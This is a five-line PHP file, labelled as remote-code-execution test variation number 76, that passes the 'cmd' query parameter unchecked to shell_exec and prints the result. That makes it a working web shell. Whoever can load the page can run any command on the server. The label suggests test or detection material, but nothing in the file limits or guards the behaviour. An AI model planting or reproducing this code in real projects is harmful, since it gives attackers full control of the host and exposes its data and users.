<?php
// RCE test variation #76
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>